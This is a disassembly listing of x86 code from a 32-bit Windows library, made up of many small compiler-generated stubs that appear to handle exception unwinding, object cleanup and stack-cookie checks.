call sub_100242d7
mov ecx [ edx - 0x4 ]
xor ecx eax
call sub_100242d7
mov eax r--data
jmp sub_10027eaa
sub_1004bdc2
lea ecx [ ebp - 0x10 ]
jmp sub_100230e4
sub_1004bdca
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x20 ]
xor ecx eax
call sub_100242d7
mov eax r--data
jmp sub_10027eaa
sub_1004bde5
push [ ebp + 0x10 ]
call sub_100242e6
pop ecx
retn
sub_1004bdef
lea ecx [ ebp - 0x2c ]
jmp sub_1000206b
sub_1004bdf7
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x30 ]
xor ecx eax
call sub_100242d7
mov eax r--data
jmp sub_10027eaa
sub_1004be12
lea ecx [ ebp - 0x84 ]
jmp sub_1000384f
sub_1004be1d
lea ecx [ ebp - 0x88 ]
jmp sub_100230e4
sub_1004be28
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x98 ]
xor ecx eax
call sub_100242d7
mov ecx [ edx - 0x4 ]
xor ecx eax
call sub_100242d7
mov eax r--data
jmp sub_10027eaa
sub_1004be50
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x24 ]
xor ecx eax
call sub_100242d7
mov eax r--data
jmp sub_10027eaa
sub_1004be6b
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x20 ]
xor ecx eax
call sub_100242d7
mov eax r--data
jmp sub_10027eaa
sub_1004be86
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x20 ]
xor ecx eax
call sub_100242d7
mov eax r--data
jmp sub_10027eaa
sub_1004bea1
mov ecx [ ebp - 0x10 ]
jmp sub_1003e89e
sub_1004bea9
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x14 ]
xor ecx eax
call sub_100242d7
mov eax r--data
jmp sub_10027eaa
sub_1004bec4
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x1c ]
xor ecx eax
call sub_100242d7
mov eax r--data
jmp sub_10027eaa
sub_1004bedf
lea ecx [ ebp - 0x2c ]
jmp sub_1000206b
sub_1004bee7
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x48 ]
xor ecx eax
call sub_100242d7
mov ecx [ edx - 0x4 ]
xor ecx eax
call sub_100242d7
mov eax r--data
jmp sub_10027eaa
sub_1004bf0c
lea ecx [ ebp - 0x34 ]
jmp sub_1000206b
sub_1004bf14
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x5c ]
xor ecx eax
call sub_100242d7
mov ecx [ edx - 0x4 ]
xor ecx eax
call sub_100242d7
mov eax r--data
jmp sub_10027eaa
sub_1004bf39
mov eax [ ebp - 0x1c ]
and eax 0x1
je r-xdata
retn
and [ ebp - 0x1c ] 0xfffffffe
mov ecx [ ebp - 0x20 ]
jmp sub_10012639
sub_1004bf52
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x34 ]
xor ecx eax
call sub_100242d7
mov eax r--data
jmp sub_10027eaa
sub_1004bf6d
mov eax [ ebp - 0x1c ]
and eax 0x1
je r-xdata
retn
and [ ebp - 0x1c ] 0xfffffffe
mov ecx [ ebp - 0x20 ]
jmp sub_100403c6
sub_1004bf86
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x34 ]
xor ecx eax
call sub_100242d7
mov eax r--data
jmp sub_10027eaa
sub_1004bfa1
push [ ebp + 0x8 ]
call sub_100242e6
pop ecx
retn
sub_1004bfab
mov eax [ ebp - 0x10 ]
and eax 0x1
je r-xdata
retn
and [ ebp - 0x10 ] 0xfffffffe
lea ecx [ ebp - 0x2c ]
jmp sub_1000206b
sub_1004bfc4
mov eax [ ebp - 0x10 ]
and eax 0x2
je r-xdata
retn
and [ ebp - 0x10 ] 0xfffffffd
lea ecx [ ebp - 0xa0 ]
jmp sub_1000384f
sub_1004bfe0
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0xa4 ]
xor ecx eax
call sub_100242d7
mov eax r--data
jmp sub_10027eaa
sub_1004bffe
lea ecx [ ebp - 0x14 ]
jmp sub_100230e4
sub_1004c006
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x24 ]
xor ecx eax
call sub_100242d7
mov eax r--data
jmp sub_10027eaa
sub_1004c021
lea ecx [ ebp - 0x3c ]
jmp sub_10003c49
sub_1004c029
lea ecx [ ebp - 0x2c ]
jmp sub_100403c6
sub_1004c031
lea ecx [ ebp - 0x5c ]
jmp sub_100403c6
sub_1004c039
lea ecx [ ebp - 0x5c ]
jmp sub_100403c6
sub_1004c041
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x60 ]
xor ecx eax
call sub_100242d7
mov ecx [ edx - 0x4 ]
xor ecx eax
call sub_100242d7
mov eax r--data
jmp sub_10027eaa
sub_1004c066
lea ecx [ ebp - 0xb0 ]
jmp sub_10003c49
sub_1004c071
lea ecx [ ebp - 0xac ]
jmp sub_10003c49
sub_1004c07c
lea ecx [ ebp - 0x48 ]
jmp sub_10012639
sub_1004c084
mov eax [ ebp - 0x70 ]
and eax 0x1
je r-xdata
retn
and [ ebp - 0x70 ] 0xfffffffe
mov ecx [ ebp - 0x7c ]
jmp sub_10012639
sub_1004c09d
lea ecx [ ebp - 0x88 ]
jmp sub_10003c49
sub_1004c0a8
lea ecx [ ebp - 0x64 ]
jmp sub_1000206b
sub_1004c0b0
lea ecx [ ebp - 0x2c ]
jmp sub_1000206b
sub_1004c0b8
mov eax [ ebp - 0x70 ]
and eax 0x2
je r-xdata
retn
and [ ebp - 0x70 ] 0xfffffffd
lea ecx [ ebp - 0x124 ]
jmp sub_10012639
sub_1004c0d4
mov eax [ ebp - 0x70 ]
and eax 0x4
je r-xdata
retn
and [ ebp - 0x70 ] 0xfffffffb
lea ecx [ ebp - 0xec ]
jmp sub_10012639
sub_1004c0f0
lea ecx [ ebp - 0x15c ]
jmp sub_10012639
sub_1004c0fb
mov eax [ ebp - 0x70 ]
and eax 0x8
je r-xdata
retn
and [ ebp - 0x70 ] 0xfffffff7
lea ecx [ ebp - 0x140 ]
jmp sub_10012639
sub_1004c117
mov eax [ ebp - 0x70 ]
and eax 0x10
je r-xdata
retn
and [ ebp - 0x70 ] 0xffffffef
lea ecx [ ebp - 0x108 ]
jmp sub_10012639
sub_1004c133
lea ecx [ ebp - 0x178 ]
jmp sub_10012639
sub_1004c13e
lea ecx [ ebp - 0x2c ]
jmp sub_10012639
sub_1004c146
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x17c ]
xor ecx eax
call sub_100242d7
mov ecx [ edx - 0x4 ]
xor ecx eax
call sub_100242d7
mov eax r--data
jmp sub_10027eaa
sub_1004c16e
lea ecx [ ebp + 0x24 ]
jmp sub_10012639
sub_1004c176
lea ecx [ ebp - 0x88 ]
jmp sub_10003c49
sub_1004c181
lea ecx [ ebp - 0x8c ]
jmp sub_10003c49
sub_1004c18c
lea ecx [ ebp - 0x2c ]
jmp sub_1000206b
sub_1004c194
lea ecx [ ebp - 0x48 ]
jmp sub_10012639
sub_1004c19c
lea ecx [ ebp - 0xc0 ]
jmp sub_10012639
sub_1004c1a7
lea ecx [ ebp - 0xc0 ]
jmp sub_10012639
sub_1004c1b2
lea ecx [ ebp - 0x64 ]
jmp sub_10012639
sub_1004c1ba
lea ecx [ ebp - 0xc0 ]
jmp sub_10012639
sub_1004c1c5
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x12c ]
xor ecx eax
call sub_100242d7
mov ecx [ edx - 0x4 ]
xor ecx eax
call sub_100242d7
mov eax r--data
jmp sub_10027eaa
sub_1004c1ed
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x20 ]
xor ecx eax
call sub_100242d7
mov eax r--data
jmp sub_10027eaa
sub_1004c208
lea ecx [ ebp - 0x48 ]
jmp sub_1000206b
sub_1004c210
lea ecx [ ebp - 0x2c ]
jmp sub_1000206b
sub_1004c218
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x74 ]
xor ecx eax
call sub_100242d7
mov ecx [ edx - 0x4 ]
xor ecx eax
call sub_100242d7
mov eax r--data
jmp sub_10027eaa
sub_1004c23d
lea ecx [ ebp - 0x2c ]
jmp sub_1000206b
sub_1004c245
lea ecx [ ebp - 0x48 ]
jmp sub_1000206b
sub_1004c24d
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x70 ]
xor ecx eax
call sub_100242d7
mov ecx [ edx - 0x4 ]
xor ecx eax
call sub_100242d7
mov eax r--data
jmp sub_10027eaa
sub_1004c272
lea ecx [ ebp - 0x78 ]
jmp sub_10003c49
sub_1004c27a
lea ecx [ ebp - 0x48 ]
jmp sub_1000206b
sub_1004c282
lea ecx [ ebp - 0x2c ]
jmp sub_1000206b
sub_1004c28a
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x7c ]
xor ecx eax
call sub_100242d7
mov ecx [ edx - 0x4 ]
xor ecx eax
call sub_100242d7
mov eax r--data
jmp sub_10027eaa
sub_1004c2af
lea ecx [ ebp - 0x50 ]
jmp sub_10003c49
sub_1004c2b7
lea ecx [ ebp - 0x2c ]
jmp sub_1000206b
sub_1004c2bf
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x54 ]
xor ecx eax
call sub_100242d7
mov ecx [ edx - 0x4 ]
xor ecx eax
call sub_100242d7
mov eax r--data
jmp sub_10027eaa
sub_1004c2e4
lea ecx [ ebp - 0xb0 ]
jmp sub_10003c49
sub_1004c2ef
lea ecx [ ebp - 0xac ]
jmp sub_10003c49
sub_1004c2fa
lea ecx [ ebp - 0x48 ]
jmp sub_100403c6
sub_1004c302
mov eax [ ebp - 0x70 ]
and eax 0x1
je r-xdata
retn
and [ ebp - 0x70 ] 0xfffffffe
mov ecx [ ebp - 0x7c ]
jmp sub_100403c6
sub_1004c31b
lea ecx [ ebp - 0x88 ]
jmp sub_10003c49
sub_1004c326
lea ecx [ ebp - 0x64 ]
jmp sub_1000206b
sub_1004c32e
lea ecx [ ebp - 0x2c ]
jmp sub_1000206b
sub_1004c336
mov eax [ ebp - 0x70 ]
and eax 0x2
je r-xdata
retn
and [ ebp - 0x70 ] 0xfffffffd
lea ecx [ ebp - 0x124 ]
jmp sub_100403c6
sub_1004c352
mov eax [ ebp - 0x70 ]
and eax 0x4
je r-xdata
retn
and [ ebp - 0x70 ] 0xfffffffb
lea ecx [ ebp - 0xec ]
jmp sub_100403c6
sub_1004c36e
lea ecx [ ebp - 0x15c ]
jmp sub_100403c6
sub_1004c379
mov eax [ ebp - 0x70 ]
and eax 0x8
je r-xdata
retn
and [ ebp - 0x70 ] 0xfffffff7
lea ecx [ ebp - 0x140 ]
jmp sub_100403c6
sub_1004c395
mov eax [ ebp - 0x70 ]
and eax 0x10
je r-xdata
retn
and [ ebp - 0x70 ] 0xffffffef
lea ecx [ ebp - 0x108 ]
jmp sub_100403c6
sub_1004c3b1
lea ecx [ ebp - 0x178 ]
jmp sub_100403c6
sub_1004c3bc
lea ecx [ ebp - 0x2c ]
jmp sub_100403c6
sub_1004c3c4
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x17c ]
xor ecx eax
call sub_100242d7
mov ecx [ edx - 0x4 ]
xor ecx eax
call sub_100242d7
mov eax r--data
jmp sub_10027eaa
sub_1004c3ec
lea ecx [ ebp + 0x24 ]
jmp sub_100403c6
sub_1004c3f4
lea ecx [ ebp - 0x88 ]
jmp sub_10003c49
sub_1004c3ff
lea ecx [ ebp - 0x8c ]
jmp sub_10003c49
sub_1004c40a
lea ecx [ ebp - 0x2c ]
jmp sub_1000206b
sub_1004c412
lea ecx [ ebp - 0x48 ]
jmp sub_100403c6
sub_1004c41a
lea ecx [ ebp - 0xc0 ]
jmp sub_100403c6
sub_1004c425
lea ecx [ ebp - 0xc0 ]
jmp sub_100403c6
sub_1004c430
lea ecx [ ebp - 0x64 ]
jmp sub_100403c6
sub_1004c438
lea ecx [ ebp - 0xc0 ]
jmp sub_100403c6
sub_1004c443
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x12c ]
xor ecx eax
call sub_100242d7
mov ecx [ edx - 0x4 ]
xor ecx eax
call sub_100242d7
mov eax r--data
jmp sub_10027eaa
sub_1004c46b
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x20 ]
xor ecx eax
call sub_100242d7
mov eax r--data
jmp sub_10027eaa
sub_1004c486
lea ecx [ ebp - 0x2c ]
jmp sub_10012639
sub_1004c48e
lea ecx [ ebp - 0x48 ]
jmp sub_1000206b
sub_1004c496
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x64 ]
xor ecx eax
call sub_100242d7
mov ecx [ edx - 0x4 ]
xor ecx eax
call sub_100242d7
mov eax r--data
jmp sub_10027eaa
sub_1004c4bb
lea ecx [ ebp - 0x2c ]
jmp sub_10012639
sub_1004c4c3
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x30 ]
xor ecx eax
call sub_100242d7
mov ecx [ edx - 0x4 ]
xor ecx eax
call sub_100242d7
mov eax r--data
jmp sub_10027eaa
sub_1004c4e8
lea ecx [ ebp - 0x54 ]
jmp sub_10012639
sub_1004c4f0
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x64 ]
xor ecx eax
call sub_100242d7
mov ecx [ edx - 0x4 ]
xor ecx eax
call sub_100242d7
mov eax r--data
jmp sub_10027eaa
sub_1004c515
lea ecx [ ebp - 0x2c ]
jmp sub_10012639
sub_1004c51d
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x3c ]
xor ecx eax
call sub_100242d7
mov ecx [ edx - 0x4 ]
xor ecx eax
call sub_100242d7
mov eax r--data
jmp sub_10027eaa
sub_1004c542
lea ecx [ ebp - 0x54 ]
jmp sub_10003c49
sub_1004c54a
lea ecx [ ebp - 0x4c ]
jmp sub_100403c6
sub_1004c552
lea ecx [ ebp - 0x2c ]
jmp sub_100403c6
sub_1004c55a
lea ecx [ ebp - 0x2c ]
jmp sub_100403c6
sub_1004c562
lea ecx [ ebp - 0x60 ]
jmp sub_10003c49
sub_1004c56a
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x70 ]
xor ecx eax
call sub_100242d7
mov ecx [ edx - 0x4 ]
xor ecx eax
call sub_100242d7
mov eax r--data
jmp sub_10027eaa
sub_1004c58f
lea ecx [ ebp - 0x40 ]
jmp sub_10003c49
sub_1004c597
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x48 ]
xor ecx eax
call sub_100242d7
mov ecx [ edx - 0x4 ]
xor ecx eax
call sub_100242d7
mov eax r--data
jmp sub_10027eaa
sub_1004c5bc
lea ecx [ ebp - 0x2c ]
jmp sub_100403c6
sub_1004c5c4
lea ecx [ ebp - 0x48 ]
jmp sub_1000206b
sub_1004c5cc
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x64 ]
xor ecx eax
call sub_100242d7
mov ecx [ edx - 0x4 ]
xor ecx eax
call sub_100242d7
mov eax r--data
jmp sub_10027eaa
sub_1004c5f1
lea ecx [ ebp - 0x2c ]
jmp sub_100403c6
sub_1004c5f9
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x30 ]
xor ecx eax
call sub_100242d7
mov ecx [ edx - 0x4 ]
xor ecx eax
call sub_100242d7
mov eax r--data
jmp sub_10027eaa
sub_1004c61e
lea ecx [ ebp - 0x54 ]
jmp sub_100403c6
sub_1004c626
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x64 ]
xor ecx eax
call sub_100242d7
mov ecx [ edx - 0x4 ]
xor ecx eax
call sub_100242d7
mov eax r--data
jmp sub_10027eaa
sub_1004c64b
lea ecx [ ebp - 0x2c ]
jmp sub_100403c6
sub_1004c653
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x3c ]
xor ecx eax
call sub_100242d7
mov ecx [ edx - 0x4 ]
xor ecx eax
call sub_100242d7
mov eax r--data
jmp sub_10027eaa
sub_1004c678
push [ ebp - 0x14 ]
call sub_100242e6
pop ecx
retn
sub_1004c682
mov eax [ ebp - 0x10 ]
and eax 0x1
je r-xdata
retn
and [ ebp - 0x10 ] 0xfffffffe
lea ecx [ ebp - 0x30 ]
jmp sub_1000206b
sub_1004c69b
mov eax [ ebp - 0x10 ]
and eax 0x2
je r-xdata
retn
and [ ebp - 0x10 ] 0xfffffffd
lea ecx [ ebp - 0xa4 ]
jmp sub_1000384f
sub_1004c6b7
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0xa8 ]
xor ecx eax
call sub_100242d7
mov eax r--data
jmp sub_10027eaa
sub_1004c6d5
push [ ebp - 0x14 ]
call sub_100242e6
pop ecx
retn
sub_1004c6df
push [ ebp - 0x14 ]
call sub_100242e6
pop ecx
retn
sub_1004c6e9
push [ ebp - 0x14 ]
call sub_100242e6
pop ecx
retn
sub_1004c6f3
push [ ebp + 0xc ]
call sub_100242e6
pop ecx
retn
sub_1004c6fd
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x18 ]
xor ecx eax
call sub_100242d7
mov eax r--data
jmp sub_10027eaa
sub_1004c718
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x20 ]
xor ecx eax
call sub_100242d7
mov eax r--data
jmp sub_10027eaa
sub_1004c733
lea ecx [ ebp - 0x34 ]
jmp sub_1000206b
sub_1004c73b
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x50 ]
xor ecx eax
call sub_100242d7
mov ecx [ edx - 0x4 ]
xor ecx eax
call sub_100242d7
mov eax r--data
jmp sub_10027eaa
sub_1004c760
mov eax [ ebp - 0x1c ]
and eax 0x1
je r-xdata
retn
and [ ebp - 0x1c ] 0xfffffffe
mov ecx [ ebp - 0x20 ]
jmp sub_1000206b
sub_1004c779
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x34 ]
xor ecx eax
call sub_100242d7
mov eax r--data
jmp sub_10027eaa
sub_1004c794
lea ecx [ ebp - 0xb8 ]
jmp sub_10003c49
sub_1004c79f
lea ecx [ ebp - 0xbc ]
jmp sub_10003c49
sub_1004c7aa
lea ecx [ ebp - 0x64 ]
jmp sub_1000206b
sub_1004c7b2
mov eax [ ebp - 0x6c ]
and eax 0x1
je r-xdata
retn
and [ ebp - 0x6c ] 0xfffffffe
mov ecx [ ebp - 0x7c ]
jmp sub_1000206b
sub_1004c7cb
lea ecx [ ebp - 0x88 ]
jmp sub_10003c49
sub_1004c7d6
lea ecx [ ebp - 0x48 ]
jmp sub_1000206b
sub_1004c7de
lea ecx [ ebp - 0x2c ]
jmp sub_1000206b
sub_1004c7e6
mov eax [ ebp - 0x6c ]
and eax 0x2
je r-xdata
retn
and [ ebp - 0x6c ] 0xfffffffd
lea ecx [ ebp - 0x128 ]
jmp sub_1000206b
sub_1004c802
mov eax [ ebp - 0x6c ]
and eax 0x4
je r-xdata
retn
and [ ebp - 0x6c ] 0xfffffffb
lea ecx [ ebp - 0xf0 ]
jmp sub_1000206b
sub_1004c81e
lea ecx [ ebp - 0x160 ]
jmp sub_1000206b
sub_1004c829
mov eax [ ebp - 0x6c ]
and eax 0x8
je r-xdata
retn
and [ ebp - 0x6c ] 0xfffffff7
lea ecx [ ebp - 0x144 ]
jmp sub_1000206b
sub_1004c845
mov eax [ ebp - 0x6c ]
and eax 0x10
je r-xdata
retn
and [ ebp - 0x6c ] 0xffffffef
lea ecx [ ebp - 0x10c ]
jmp sub_1000206b
sub_1004c861
lea ecx [ ebp - 0x17c ]
jmp sub_1000206b
sub_1004c86c
lea ecx [ ebp - 0x2c ]
jmp sub_1000206b
sub_1004c874
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x180 ]
xor ecx eax
call sub_100242d7
mov ecx [ edx - 0x4 ]
xor ecx eax
call sub_100242d7
mov eax r--data
jmp sub_10027eaa
sub_1004c89c
lea ecx [ ebp + 0x24 ]
jmp sub_1000206b
sub_1004c8a4
lea ecx [ ebp - 0x84 ]
jmp sub_10003c49
sub_1004c8af
lea ecx [ ebp - 0x88 ]
jmp sub_10003c49
sub_1004c8ba
lea ecx [ ebp - 0x2c ]
jmp sub_1000206b
sub_1004c8c2
lea ecx [ ebp - 0x48 ]
jmp sub_1000206b
sub_1004c8ca
lea ecx [ ebp - 0xc4 ]
jmp sub_1000206b
sub_1004c8d5
lea ecx [ ebp - 0xc4 ]
jmp sub_1000206b
sub_1004c8e0
lea ecx [ ebp - 0x64 ]
jmp sub_1000206b
sub_1004c8e8
lea ecx [ ebp - 0xc4 ]
jmp sub_1000206b
sub_1004c8f3
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x130 ]
xor ecx eax
call sub_100242d7
mov ecx [ edx - 0x4 ]
xor ecx eax
call sub_100242d7
mov eax r--data
jmp sub_10027eaa
sub_1004c91b
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x20 ]
xor ecx eax
call sub_100242d7
mov eax r--data
jmp sub_10027eaa
sub_1004c936
lea ecx [ ebp - 0x2c ]
jmp sub_1000206b
sub_1004c93e
lea ecx [ ebp - 0x48 ]
jmp sub_1000206b
sub_1004c946
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x5c ]
xor ecx eax
call sub_100242d7
mov ecx [ edx - 0x4 ]
xor ecx eax
call sub_100242d7
mov eax r--data
jmp sub_10027eaa
sub_1004c96b
lea ecx [ ebp - 0x2c ]
jmp sub_1000206b
sub_1004c973
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x30 ]
xor ecx eax
call sub_100242d7
mov ecx [ edx - 0x4 ]
xor ecx eax
call sub_100242d7
mov eax r--data
jmp sub_10027eaa
sub_1004c998
lea ecx [ ebp - 0x54 ]
jmp sub_1000206b
sub_1004c9a0
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x64 ]
xor ecx eax
call sub_100242d7
mov ecx [ edx - 0x4 ]
xor ecx eax
call sub_100242d7
mov eax r--data
jmp sub_10027eaa
sub_1004c9c5
push [ ebp - 0x10 ]
call sub_100242e6
pop ecx
retn
sub_1004c9cf
push [ ebp - 0x10 ]
call sub_100242e6
pop ecx
retn
sub_1004c9d9
push [ ebp + 0xc ]
call sub_100242e6
pop ecx
retn
sub_1004c9e3
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x14 ]
xor ecx eax
call sub_100242d7
mov eax r--data
jmp sub_10027eaa
sub_1004c9fe
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x14 ]
xor ecx eax
call sub_100242d7
mov eax r--data
jmp sub_10027eaa
sub_1004ca19
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x14 ]
xor ecx eax
call sub_100242d7
mov eax r--data
jmp sub_10027eaa
sub_1004ca34
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x14 ]
xor ecx eax
call sub_100242d7
mov eax r--data
jmp sub_10027eaa
sub_1004ca4f
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x14 ]
xor ecx eax
call sub_100242d7
mov eax r--data
jmp sub_10027eaa
sub_1004ca6a
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x14 ]
xor ecx eax
call sub_100242d7
mov eax r--data
jmp sub_10027eaa
sub_1004ca85
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x14 ]
xor ecx eax
call sub_100242d7
mov eax r--data
jmp sub_10027eaa
sub_1004caa0
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x14 ]
xor ecx eax
call sub_100242d7
mov eax r--data
jmp sub_10027eaa
sub_1004cabb
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x1c ]
xor ecx eax
call sub_100242d7
mov eax r--data
jmp sub_10027eaa
sub_1004cad6
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x24 ]
xor ecx eax
call sub_100242d7
mov eax r--data
jmp sub_10027eaa
sub_1004caf1
lea esi [ ebp - 0x10 ]
jmp sub_1000ecb0
sub_1004caf9
lea esi [ ebp - 0x14 ]
jmp sub_1000ecb0
sub_1004cb01
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x18 ]
xor ecx eax
call sub_100242d7
mov eax r--data
jmp sub_10027eaa
sub_1004cb1c
mov ecx [ ebp + 0x8 ]
add ecx 0x4
jmp sub_10023115
sub_1004cb27
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x10 ]
xor ecx eax
call sub_100242d7
mov eax r--data
jmp sub_10027eaa
sub_1004cb42
mov ecx [ ebp - 0x10 ]
sub ecx 0x48
jmp sub_100097c9
sub_1004cb4d
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x14 ]
xor ecx eax
call sub_100242d7
mov eax r--data
jmp sub_10027eaa
sub_1004cb68
mov ecx [ ebp - 0x10 ]
sub ecx 0x48
jmp sub_100029b4
sub_1004cb73
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x14 ]
xor ecx eax
call sub_100242d7
mov eax r--data
jmp sub_10027eaa
sub_1004cb8e
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x1c ]
xor ecx eax
call sub_100242d7
mov eax r--data
jmp sub_10027eaa
sub_1004cba9
mov eax [ ebp + 0x8 ]
jmp sub_10001447
sub_1004cbb1
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x10 ]
xor ecx eax
call sub_100242d7
mov eax r--data
jmp sub_10027eaa
sub_1004cbcc
mov ecx [ ebp - 0x10 ]
add ecx 0x4
jmp sub_10012639
sub_1004cbd7
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x14 ]
xor ecx eax
call sub_100242d7
mov eax r--data
jmp sub_10027eaa
sub_1004cbf2
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x1c ]
xor ecx eax
call sub_100242d7
mov eax r--data
jmp sub_10027eaa
sub_1004cc0d
lea eax [ ebp + 0x10 ]
jmp sub_1000d7e7
sub_1004cc15
mov eax [ ebp + 0x8 ]
add eax 0x4
jmp sub_1000d7e7
sub_1004cc20
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x10 ]
xor ecx eax
call sub_100242d7
mov eax r--data
jmp sub_10027eaa
sub_1004cc3b
mov eax [ ebp + 0x8 ]
add eax 0x4
jmp sub_1000d7e7
sub_1004cc46
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x10 ]
xor ecx eax
call sub_100242d7
mov eax r--data
jmp sub_10027eaa
sub_1004cc61
mov ecx [ ebp - 0x10 ]
jmp sub_10012639
sub_1004cc69
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x1c ]
xor ecx eax
call sub_100242d7
mov eax r--data
jmp sub_10027eaa
sub_1004cc84
mov ecx [ ebp + 0x8 ]
jmp sub_10012639
sub_1004cc8c
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x10 ]
xor ecx eax
call sub_100242d7
mov eax r--data
jmp sub_10027eaa
sub_1004cca7
lea ecx [ ebp + 0x8 ]
jmp sub_10012639
sub_1004ccaf
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x10 ]
xor ecx eax
call sub_100242d7
mov eax r--data
jmp sub_10027eaa
sub_1004ccca
mov ecx [ ebp - 0x10 ]
jmp sub_100230e4
sub_1004ccd2
mov ecx [ ebp - 0x10 ]
add ecx 0x4
jmp sub_1000206b
sub_1004ccdd
mov ecx [ ebp - 0x10 ]
add ecx 0x20
jmp sub_1000206b
sub_1004cce8
mov ecx [ ebp - 0x10 ]
add ecx 0x3c
jmp sub_1000206b
sub_1004ccf3
mov ecx [ ebp - 0x10 ]
add ecx 0x58
jmp sub_1000206b
sub_1004ccfe
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x14 ]
xor ecx eax
call sub_100242d7
mov eax r--data
jmp sub_10027eaa
sub_1004cd19
push [ ebp - 0x10 ]
push [ ebp - 0x14 ]
call sub_10001a27
